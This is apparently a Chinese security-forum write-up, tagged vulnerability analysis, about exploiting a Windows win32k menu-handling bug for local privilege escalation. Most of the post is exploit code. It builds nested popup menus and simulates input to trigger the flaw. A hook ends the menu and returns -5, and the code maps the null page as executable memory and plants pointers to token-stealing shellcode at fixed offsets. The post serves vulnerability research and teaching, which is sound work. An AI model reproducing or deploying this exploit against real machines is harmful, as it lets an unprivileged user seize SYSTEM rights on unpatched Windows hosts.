
```c
main(){
    HWND main_wnd = CreateWindowA(wnd_class.lpszClassName, "", WS_OVERLAPPEDWINDOW | WS_VISIBLE, 0, 0, 640, 480, NULL, NULL, wnd_class.hInstance, NULL);
}
//Creates an empty popup menu
HMENU MenuOne = CreatePopupMenu();
MENUITEMINFOA MenuOneInfo = { 0 };
//Default size
MenuOneInfo.cbSize = sizeof(MENUITEMINFOA);
//Selects what properties to retrieve or set when GetMenuItemInfo/SetMenuItemInfo are called, in this case only dwTypeData which the contents of the menu item.
MenuOneInfo.fMask = MIIM_STRING;
BOOL insertMenuItem = InsertMenuItemA(MenuOne, 0, TRUE, &MenuOneInfo);
HMENU MenuTwo = CreatePopupMenu();
MENUITEMINFOA MenuTwoInfo = { 0 };
MenuTwoInfo.cbSize = sizeof(MENUITEMINFOA);
//On this window hSubMenu should be included in Get/SetMenuItemInfo
MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);
//The menu is a sub menu of the first menu
MenuTwoInfo.hSubMenu = MenuOne;
//The contents of the menu item - in this case nothing
MenuTwoInfo.dwTypeData = "";
//The length of the menu item text - in the case 1 for just a single NULL byte
MenuTwoInfo.cch = 1;
insertMenuItem = InsertMenuItemA(MenuTwo, 0, TRUE, &MenuTwoInfo);
HHOOK setWindowsHook = SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId());
TrackPopupMenu(
    MenuTwo, //Handle to the menu we want to display, for us its the submenu we just created.
    0, //Options on how the menu is aligned, what clicks are allowed etc, we don't care.
    0, //Horizontal position - left hand side
    0, //Vertical position - Top edge
    0, //Reserved field, has to be 0
    main_wnd, //Handle to the Window which owns the menu
    NULL //This value is always ignored...
);
//tidy up the screen
```

模拟事件

```c
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    /*
    Wait until the window is idle and then send the messages needed to 'click' on the submenu to trigger the bug
    手动触发按下事件
    通过PostMessageA函数发送了三次异步消息，模拟了键盘和鼠标的操作从而达到漏洞
    */
    printf("WindProc called with message=%d\n", msg);
    if (msg == WM_ENTERIDLE) {
        PostMessageA(hwnd, WM_KEYDOWN, VK_DOWN, 0);
        PostMessageA(hwnd, WM_KEYDOWN, VK_RIGHT, 0);
        PostMessageA(hwnd, WM_LBUTTONDOWN, 0, 0);
    }
    //Just pass any other messages to the default window procedure
    return DefWindowProc(hwnd, msg, wParam, lParam);
}
```

`SetWindowsHookExA`拦截`0x1EB`消息，`SetWindowLongA`设置了一次窗口函数是因为只有在窗口处理函数线程的上下文空间中调用`EndMenu`函数才有意义，我们调用`EndMenu`函数销毁了这个菜单，此时的`win32k!xxxSendMessage`函数进行调用就会失败，上层函数`win32k!xxxMNFindWindowFromPoint`就会返回`fffffffb`。

```c
//Destroys the menu and then returns -5, this will be passed to xxxSendMessage which will then use it as a pointer.
LRESULT CALLBACK HookCallbackTwo(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
    printf("Callback two called.\n");
    EndMenu();
    return -5;
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam) {
    printf("Callback one called.\n");
    /*
    lParam is a pointer to a CWPSTRUCT which is defined as:
    typedef struct tagCWPSTRUCT {
        LPARAM lParam;
        WPARAM wParam;
        UINT   message;
        HWND   hwnd;
    } CWPSTRUCT, *PCWPSTRUCT, *LPCWPSTRUCT;
    */
    //lparam+8 is the message sent to the window, here we are checking for the message which is sent to a window when the function xxxMNFindWindowFromPoint is called
    if (*(DWORD *)(lParam + 8) == 0x1EB) {
        //解除Hook
        if (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) {
            //lparam+12 is a Window Handle pointing to the window - here we are setting its callback to be our second one
            SetWindowLongA(*(HWND *)(lParam + 12), GWLP_WNDPROC, (LONG)HookCallbackTwo);
        }
    }
    return CallNextHookEx(0, code, wParam, lParam);
}
```

控制`0x3`，`0x11`，`0x5B`这几个地址的值，就能进行漏洞的利用。

申请0页内存后写入，shellcode使用`TokenSteal`即可。

```c
typedef NTSTATUS(NTAPI *lNtAllocateVirtualMemory)(
    IN  HANDLE  ProcessHandle,
    IN  PVOID *BaseAddress,
    IN  PULONG  ZeroBits,
    IN  PSIZE_T RegionSize,
    IN  ULONG   AllocationType,
    IN  ULONG   Protect
);
//Gets a pointer to the Win32ThreadInfo structure for the current thread by indexing into the Thread Execution Block for the current thread
DWORD __stdcall GetPTI() {
    __asm {
        mov eax, fs:18h //eax pointer to TEB
        mov eax, [eax + 40h] //get pointer to Win32ThreadInfo
    }
}

//Loads ntdll.dll into the processes memory space and returns a HANDLE to it
HMODULE hNtdll = LoadLibraryA("ntdll");
lNtAllocateVirtualMemory pNtAllocateVirtualMemory = (lNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
DWORD base_address = 1;
//Aritary size which is probably big enough - it'll get rounded up to the next memory page boundary anyway
SIZE_T region_size = 0x1000;
NTSTATUS tmp = pNtAllocateVirtualMemory(
    GetCurrentProcess(), //HANDLE ProcessHandle => The process the mapping should be done for, we pass this process.
    (LPVOID*)(&base_address), // PVOID *BaseAddress => The base address we want our memory allocated at, this will be rounded down to the nearest page boundary and the new value will written to it
    0, //ULONG_PTR ZeroBits => The number of high-order address bits that must be zero in the base address, this is only used when the base address passed is NULL
    &region_size, //RegionSize => How much memory we want allocated, this will be rounded up to the nearest page boundary and the updated value will be written to the variable
    (MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN), //ULONG AllocationType => What type of allocation to be done - the chosen flags mean the memory will allocated at the highest valid address and will immediately be reserved and commited so we can use it.
    PAGE_EXECUTE_READWRITE //ULONG Protect => The page protection flags the memory should be created with, we want RWX
);
void* pti_loc = (void *)0x3;
void* check_loc = (void *)0x11;
void* shellcode_loc = (void *)0x5b;
*(LPDWORD)pti_loc = pti;
*(LPBYTE)check_loc = 0x4;
*(LPDWORD)shellcode_loc = (DWORD)TokenStealingShellcodeWin7;
```

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2022-12-29 14:26 被hml189编辑，原因：

[#漏洞分析](https://bbs.kanxue.com/forum-150-1-153.htm)

[#Windows](https://bbs.kanxue.com/forum-150-1-160.htm)
